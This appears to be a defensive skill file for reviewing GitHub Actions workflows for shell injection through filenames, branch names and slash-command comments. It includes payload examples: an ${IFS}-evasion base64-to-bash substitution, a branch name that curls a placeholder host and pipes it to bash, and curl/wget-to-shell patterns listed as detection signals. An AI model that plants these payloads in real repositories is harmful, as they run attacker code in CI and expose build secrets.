---
name: ci-injection-patterns
description: GitHub Actions / CI shell-injection patterns — filename payloads, ${IFS} space-evasion, and pipe-to-shell.
---

# CI shell-injection patterns

GitHub Actions workflows that interpolate attacker-controlled values (a PR title, a branch name, a
**filename**) into a `run:` shell step are injectable. The classic real-world payload hides a command in
a crafted filename and relies on the workflow expanding it.

## Space evasion with `${IFS}`
A shell splits words on `$IFS` (default space/tab/newline). An attacker who cannot use literal spaces
writes `${IFS}` (or `$IFS`) between tokens so a naive filter that blocks spaces is bypassed:

```
$(echo${IFS}<base64>|base64${IFS}-d|bash)
```

When a workflow interpolates such a filename into a shell context, the substitution runs. Treat any
`${IFS}` in a change as a **high** signal, and decode the surrounding base64 to see the real command.

## Other channels the author controls
The diff is not the only text a workflow interpolates. Two more carried the hackerbot-claw campaign:
- **The head branch name** (the `### BRANCH` section). Git allows `$(...)`, backticks and `{a,b}` brace
  lists in a ref name, and a workflow that expands `github.head_ref` into a shell runs them. The
  space-free spelling `dev$({curl,-sSfL,host/x}${IFS}|${IFS}bash)` is a downloader; a base64 branch name
  decodes to one. A branch a human named seldom looks like this, though a maintainer can (`fix/handle_${HOME}_expansion`): weigh who pushed it. A fork or an outsider carrying one is the attack shape; an owner, member or collaborator carrying one is odd but can already push.
- **Comments** (the `### COMMENT` sections). `issue_comment` workflows dispatch on slash commands such as
  `/format` or `/version minor`. A command typed by the change's own author within an hour of opening it,
  or by an outsider, is the trigger shape; judge it together with what the workflow would then run. A comment
  is the WRITER's evidence: a payload in a drive-by's comment says something about the drive-by, not about the
  author of the PR it was posted on.

## Command substitution and pipe-to-shell
- `$(...)` / backticks — run a subcommand; combined with `${IFS}` and base64 it hides a downloader.
- `curl … | bash`, `wget … | sh` — download-and-execute; a **critical** signal. The remote script is
  attacker-controlled and never reviewed.
- `chmod +x` then execute — stages a dropped binary/script.

## De-obfuscation is your job
Decode base64/hex IN THE REPL and `scan_indicators` the DECODED value — the deterministic detectors
re-scan decoded content for exactly these patterns and will surface the hidden `curl … | bash`.

## Why this matters even with least privilege
A workflow may run with minimal token scope, but the injection still executes attacker code in CI —
enough to exfiltrate a build secret, poison a cache, or pivot. Classify on the INJECTION, not on a guess
about what privileges it ends up with.
